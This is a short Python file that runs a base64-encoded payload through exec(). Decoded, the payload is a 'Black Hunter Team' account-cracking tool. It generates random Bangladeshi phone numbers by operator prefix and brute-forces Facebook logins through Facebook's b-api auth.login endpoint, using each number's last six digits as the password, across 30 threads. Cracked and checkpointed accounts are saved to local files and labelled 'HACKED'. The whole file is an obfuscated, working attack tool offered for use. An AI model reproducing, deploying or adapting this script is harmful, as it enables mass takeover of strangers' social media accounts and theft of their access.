import base64
exec(base64.b64decode("IyBEZWNvbXBpbGUgYnkgQkgtVEVBTQoKICMhL3Vzci9iaW4vcHl0aG9uCiAjIHVuY29tcHlsZTYgdmVyc2lvbiAzLjcuNAppbXBvcnQgb3MsIHN5cywgdGltZSwgZGF0ZXRpbWUsIHJhbmRvbSwgaGFzaGxpYiwgcmUsIHRocmVhZGluZywganNvbiwgdXJsbGliLCBjb29raWVsaWIsIGdldHBhc3MKb3Muc3lzdGVtKCdybSAtcmYgLnR4dCcpCiAKZGVmIHBzYih6KToKICAgIGZvciBlIGluIHogKyAnXG4nOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZSkKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDMpCiAKb3Muc3lzdGVtKCdjbGVhcicpCnByaW50CiAKcHJpbnQKIApwcmludCgiIiIKClwwMzNbOTM7MW0gIF9fX18gICAgICAgIF8gICAgXyAgIF9fX19fX18gX19fX19fICAgICAgICAgIF9fICBfXyAKXDAzM1sxOzMybSB8ICBfIFwgICAgICB8IHwgIHwgfCB8X18gICBfX3wgIF9fX198ICAgL1wgICB8ICBcLyAgfApcMDMzWzkxOzFtIHwgfF8pIHxfX19fX3wgfF9ffCB8ICAgIHwgfCAgfCB8X18gICAgIC8gIFwgIHwgXCAgLyB8ClwwMzNbOTU7MW0gfCAgXyA8X19fX19ffCAgX18gIHwgICAgfCB8ICB8ICBfX3wgICAvIC9cIFwgfCB8XC98IHwKXDAzM1s5NDsxbSB8IHxfKSB8ICAgICB8IHwgIHwgfCAgICB8IHwgIHwgfF9fX18gLyBfX19fIFx8IHwgIHwgfApcMDMzWzkzOzFtIHxfX19fLyAgICAgIHxffCAgfF98ICAgIHxffCAgfF9fX19fXy9fLyAgICBcX1xffCAgfF98ICAgICAgICAgCiAKIiIiKQoKcHJpbnQoIlwwMzNbMDs5MW1UaGlzIFRvb2wncyBGcmVlIEJ5IEJsYWNrIEh1bnRlciBUZWFtIikKCnBzYignXHgxYlsxOzkybUJBTkdMQURFU0ggNiBESUdJVCBDTE9OSU5HIFNUQVJUIFBMRUFTRSBXQUlUIC4uLi4uJykKZm9yIG4gaW4gcmFuZ2UoOTAwMDApOgogICAgbm1iciA9IHJhbmRvbS5yYW5kaW50KDExMTExMTEsIDk5OTk5OTkpCiAgICBzeXMuc3Rkb3V0ID0gb3BlbignLnR4dCcsICdhJykKICAgIHByaW50IG5tYnIKICAgIHN5cy5zdGRvdXQuZmx1c2goKQogCnRyeToKICAgIGltcG9ydCByZXF1ZXN0cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3BpcDIgaW5zdGFsbCByZXF1ZXN0cycpCiAKdHJ5OgogICAgaW1wb3J0IG1lY2hhbml6ZQpleGNlcHQgSW1wb3J0RXJyb3I6CiAgICBvcy5zeXN0ZW0oJ3BpcDIgaW5zdGFsbCBtZWNoYW5pemUnKQogICAgdGltZS5zbGVlcCgxKQogICAgb3Muc3lzdGVtKCdweXRob24yIEMnKQogCmZyb20gbXVsdGlwcm9jZXNzaW5nLnBvb2wgaW1wb3J0IFRocmVhZFBvb2wKZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3IKZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXIKb3Muc3lzdGVtKCdjbGVhcicpCnJlbG9hZChzeXMpCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0ZjgnKQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkKYnIuc2V0X2hhbmRsZV9yb2JvdHMoRmFsc2UpCmJyLnNldF9oYW5kbGVfcmVmcmVzaChtZWNoYW5pemUuX2h0dHAuSFRUUFJlZnJlc2hQcm9jZXNzb3IoKSwgbWF4X3RpbWU9MSkKYnIuYWRkaGVhZGVycyA9IFsKICgndXNlci1hZ2VudCcsICdEYWx2aWsvMS42LjAgKExpbnV4OyBVOyBBbmRyb2lkIDQuNC4yOyBOWDU1IEJ1aWxkL0tPVDU1MDYpIFtGQkFOL0ZCNEE7RkJBVi8xMDYuMC4wLjI2LjY4O0ZCQlYvNDU5MDQxNjA7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJMQy9pdF9JVDtGQlJWLzQ1OTA0MTYwO0ZCQ1IvUG9zdGVNb2JpbGU7RkJNRi9hc3VzO0ZCQkQvYXN1cztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9BU1VTX1owMEFEO0ZCU1YvNS4wO0ZCT1AvMTtGQkNBL3g4Njphcm1lYWJpLXY3YTtdJyldCiAKZGVmIGV4YigpOgogICAgcHJpbnQKICAgIG9zLnN5cy5leGl0KCkKIAogCmRlZiBwc2Ioeik6CiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdGltZS5zbGVlcCgwLjAzKQogCiAKZGVmIHQoKToKICAgIHRpbWUuc2xlZXAoMSkKIAogCmRlZiBjYigpOgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAKbG9nbyA9ICIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgClwwMzNbOTM7MW0gIF9fX18gICAgICAgIF8gICAgXyAgIF9fX19fX18gX19fX19fICAgICAgICAgIF9fICBfXyAKXDAzM1sxOzMybSB8ICBfIFwgICAgICB8IHwgIHwgfCB8X18gICBfX3wgIF9fX198ICAgL1wgICB8ICBcLyAgfApcMDMzWzkxOzFtIHwgfF8pIHxfX19fX3wgfF9ffCB8ICAgIHwgfCAgfCB8X18gICAgIC8gIFwgIHwgXCAgLyB8ClwwMzNbOTU7MW0gfCAgXyA8X19fX19ffCAgX18gIHwgICAgfCB8ICB8ICBfX3wgICAvIC9cIFwgfCB8XC98IHwKXDAzM1s5NDsxbSB8IHxfKSB8ICAgICB8IHwgIHwgfCAgICB8IHwgIHwgfF9fX18gLyBfX19fIFx8IHwgIHwgfApcMDMzWzkzOzFtIHxfX19fLyAgICAgIHxffCAgfF98ICAgIHxffCAgfF9fX19fXy9fLyAgICBcX1xffCAgfF98ICAgICAgICAgCiAKIiIiCgpiYWNrID0gMApzdWNjZXNzZnVsID0gW10KY3BiID0gW10Kb2tzID0gW10KaWQgPSBbXQogCmRlZiBtZW51KCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50ICcnCiAgICBwcmludCAnXDAzM1swOzkzbUFVVEhPUiAgIDogRVZBTiBWQUknCiAgICBwcmludCAnXDAzM1swOzk0bUZBQ0VCT09LIDogRVZBTiBDSE9XREhVUlknCiAgICBwcmludCAnXDAzM1swOzk2bUdST1VQICAgOiBCTEFDSyBIVU5URVIgVEVBTScKICAgIHByaW50ICcnCiAgICBwcmludCAnXDAzM1swOzkwbU9OTFkgQkFOR0xBREVTSEkgQUNDT1VOVFMgQVJFIEFWQUlMQUJMRScKICAgIHByaW50ICdcMDMzWzA7OTFtJwogICAgcHJpbnQgNTAqICctJwogICAgcHJpbnQgJ1wwMzNbMDs5Mm1bMV0gIFx4MWJbMTs5M21HUCcKICAgIHByaW50ICdcMDMzWzA7OTVtWzJdICBceDFiWzE7OTVtUm9iaScKICAgIHByaW50ICdcMDMzWzA7OTRtWzNdICBceDFiWzE7OTRtQWlydGVsJwogICAgcHJpbnQgJ1wwMzNbMDs5Mm1bNF0gIFx4MWJbMTs5Mm1CYW5nbGFsaW5rJwogICAgcHJpbnQgJ1wwMzNbMDs5Nm1bNV0gIFx4MWJbMTs5Nm1UZWxldGFsaycKICAgIHByaW50ICdcMDMzWzA7OTBtWzBdICBceDFiWzE7OTBtRXhpdCAgICAgICAgICAgICcKICAgIHByaW50ICdcMDMzWzA7OTFtJwogICAgcHJpbnQgNTAgKiAnLScKICAgIGFjdGlvbigpCiAKIApkZWYgYWN0aW9uKCk6CiAgICBnbG9iYWwgY3BiCiAgICBnbG9iYWwgb2tzCiAgICBiY2ggPSByYXdfaW5wdXQoJ1wwMzNbMDs5M21cbj4gJykKICAgIGlmIGJjaCA9PSAnJzoKICAgICAgICBwcmludAogICAgICAgIGFjdGlvbigpCiAgICBlbGlmIGJjaCA9PSAnMSc6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50IDUwKiAnLScKICAgICAgICBwcmludCAnJwogICAgICAgIHByaW50ICcxNzAsMTcxLCAxNzIsIDE3MywgMTc0LCAxNzUsIDE3NiwgMTc3LCAxNzgsIDE3OSwxMzAsMTMxLCAxMzIsIDEzMywgMTM0LCAxMzUsIDEzNiwgMTM3LCAxMzgsIDEzOScKICAgICAgICBwcmludCcnCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjID0gcmF3X2lucHV0KCdcMDMzWzA7OTNtQ2hvb3NlIENvZGUgOiAnKQogICAgICAgICAgICBrID0gJys4ODAnCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0JwogICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwgJ3InKS5yZWFkbGluZXMoKToKICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCiAKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1shXSBGaWxlIE5vdCBGb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblsgQmFjayBdJykKICAgICAgICAgICAgbWVudSgpCiAKICAgIGVsaWYgYmNoID09ICcyJzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTAqICctJwogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJzE4MCwxODEsIDE4MiwgMTgzLCAxODQsIDE4NSwgMTg2LCAxODcsIDE4OCwgMTg5JwogICAgICAgIHByaW50JycKICAgICAgICB0cnk6CiAgICAgICAgICAgIGMgPSByYXdfaW5wdXQoJ1wwMzNbMDs5M21DaG9vc2UgQ29kZSA6ICcpCiAgICAgICAgICAgIGsgPSAnKzg4MCcKICAgICAgICAgICAgaWRsaXN0ID0gJy50eHQnCiAgICAgICAgICAgIGZvciBsaW5lIGluIG9wZW4oaWRsaXN0LCAncicpLnJlYWRsaW5lcygpOgogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkKIAogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQogICAgICAgICAgICBtZW51KCkKIAogICAgZWxpZiBiY2ggPT0gJzMnOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCA1MCogJy0nCiAgICAgICAgcHJpbnQgJycKICAgICAgICBwcmludCAnMTYwLDE2MSwgMTYyLCAxNjMsIDE2NCwgMTY1LCAxNjYsIDE2NywgMTY4LCAxNjknCiAgICAgICAgcHJpbnQnJwogICAgICAgIHRyeToKICAgICAgICAgICAgYyA9IHJhd19pbnB1dCgnXDAzM1swOzkzbUNob29zZSBDb2RlIDogJykKICAgICAgICAgICAgayA9ICcrODgwJwogICAgICAgICAgICBpZGxpc3QgPSAnLnR4dCcKICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3BlbihpZGxpc3QsICdyJykucmVhZGxpbmVzKCk6CiAgICAgICAgICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQogCiAgICAgICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgICAgIHByaW50ICdbIV0gRmlsZSBOb3QgRm91bmQnCiAgICAgICAgICAgIHJhd19pbnB1dCgnXG5bIEJhY2sgXScpCiAgICAgICAgICAgIG1lbnUoKQogCiAgICBlbGlmIGJjaCA9PSAnNCc6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50IDUwKiAnLScKICAgICAgICBwcmludCAnJwogICAgICAgIHByaW50ICcxOTAsMTkxLCAxOTIsIDE5MywgMTk0LCAxOTUsIDE5NiwgMTk3LCAxOTgsIDE5OSwxNDAsMTQxLCAxNDIsIDE0MywgMTQ0LCAxNDUsIDE0NiwgMTQ3LCAxNDgsIDE0OScKICAgICAgICBwcmludCcnCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjID0gcmF3X2lucHV0KCdcMDMzWzA7OTNtQ2hvb3NlIENvZGUgOiAnKQogICAgICAgICAgICBrID0gJys4ODAnCiAgICAgICAgICAgIGlkbGlzdCA9ICcudHh0JwogICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwgJ3InKS5yZWFkbGluZXMoKToKICAgICAgICAgICAgICAgIGlkLmFwcGVuZChsaW5lLnN0cmlwKCkpCiAKICAgICAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1shXSBGaWxlIE5vdCBGb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblsgQmFjayBdJykKICAgICAgICAgICAgbWVudSgpCiAKICAgIGVsaWYgYmNoID09ICc1JzoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCBsb2dvCiAgICAgICAgcHJpbnQgNTAqICctJwogICAgICAgIHByaW50ICcnCiAgICAgICAgcHJpbnQgJzE1MCwxNTEsIDE1MiwgMTUzLCAxNTQsIDE1NSwgMTU2LCAxNTcsIDE1OCwgMTU5JwogICAgICAgIHByaW50JycKICAgICAgICB0cnk6CiAgICAgICAgICAgIGMgPSByYXdfaW5wdXQoJ1wwMzNbMDs5M21DaG9vc2UgQ29kZSA6ICcpCiAgICAgICAgICAgIGsgPSAnKzg4MCcKICAgICAgICAgICAgaWRsaXN0ID0gJy50eHQnCiAgICAgICAgICAgIGZvciBsaW5lIGluIG9wZW4oaWRsaXN0LCAncicpLnJlYWRsaW5lcygpOgogICAgICAgICAgICAgICAgaWQuYXBwZW5kKGxpbmUuc3RyaXAoKSkKIAogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnWyFdIEZpbGUgTm90IEZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuWyBCYWNrIF0nKQogICAgICAgICAgICBtZW51KCkKIAogICAgZWxpZiBiY2ggPT0gJzAnOgogICAgICAgIGV4YigpCiAgICBlbHNlOgogICAgICAgIHByaW50CiAgICAgICAgYWN0aW9uKCkKICAgIHh4eCA9IHN0cihsZW4oaWQpKQogICAgcHNiKCdbXHhlMlx4OWNceDkzXSBUb3RhbCBOdW1iZXJzOiAnICsgeHh4KQogICAgdGltZS5zbGVlcCgwLjUpCiAgICBwc2IoJ1tceGUyXHg5Y1x4OTZdIFBsZWFzZSB3YWl0LCBwcm9jZXNzIGlzIHJ1bm5pbmcgLi4uJykKICAgIHRpbWUuc2xlZXAoMC41KQogICAgcHNiKCdbIV0gVG8gU3RvcCBQcm9jZXNzIFByZXNzIENUUkwgVGhlbiBQcmVzcyB6JykKICAgIHRpbWUuc2xlZXAoMC41KQogICAgcHNiKDUwICogJy0nKQogICAgdGltZS5zbGVlcCgwLjUpCiAgICBwcmludAogICAgNTAgKiAnLScKICAgIHByaW50CiAKICAgIGRlZiBtYWluKGFyZyk6CiAgICAgICAgdXNlciA9IGFyZwogICAgICAgIHRyeToKICAgICAgICAgICAgb3MubWtkaXIoJ3NhdmUnKQogICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICBwYXNzCiAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3VsdCA9IGsgKyBjICsgdXNlcgogICAgICAgICAgICBkaWdpNiA9IHJlc3VsdFs4OjE0XQogICAgICAgICAgICBwYXNzMSA9IGRpZ2k2CiAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMSArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQogICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybVtCSC1URUFNLUhBQ0tFRF1ceDFiWzBtICcgKyBrICsgYyArIHVzZXIgKyAnIHwgJyArIHBhc3MxICsgJ1xuJyArICdcbicKICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NhdmUvc3VjY2Vzc2Z1bGwudHh0JywgJ2EnKQogICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArICd8JyArIHBhc3MxICsgJ1xuJykKICAgICAgICAgICAgICAgIG9rYi5jbG9zZSgpCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGMgKyB1c2VyICsgcGFzczEpCiAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bQkgtVEVBTS1DUF1ceDFiWzBtICcgKyBrICsgYyArIHVzZXIgKyAnIHwgJyArIHBhc3MxICsgJ1x4MWJbMTs5Mm0gXHgxYlswbSBcbicKICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NhdmUvY2hlY2twb2ludC50eHQnLCAnYScpCiAgICAgICAgICAgICAgICBjcHMud3JpdGUoayArIGMgKyB1c2VyICsgJ3wnICsgcGFzczEgKyAnXG4nKQogICAgICAgICAgICAgICAgY3BzLmNsb3NlKCkKICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKIAogICAgcCA9IFRocmVhZFBvb2woMzApCiAgICBwLm1hcChtYWluLCBpZCkKICAgIHByaW50CiAgICA1MCAqICctJwogICAgcHJpbnQKICAgIHByaW50CiAgICAnW1x4ZTJceDljXHg5M10gVG90YWwgT0svQ1AgOiAnICsgc3RyKGxlbihva3MpKSArICcvJyArIHN0cihsZW4oY3BiKSkKICAgIHByaW50ICdbXHhlMlx4OWNceDkzXSBDUCBGaWxlIEhhcyBCZWVuIFNhdmVkIDogc2F2ZS9jaGVja3BvaW50LnR4dCcKICAgIHJhd19pbnB1dCgnXG5bUHJlc3MgRW50ZXIgVG8gR28gQmFja10nKQogICAgb3Muc3lzdGVtKCdweXRob24yIEVWQU4ucHknKQogCiAKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIG1lbnUoKQoK"))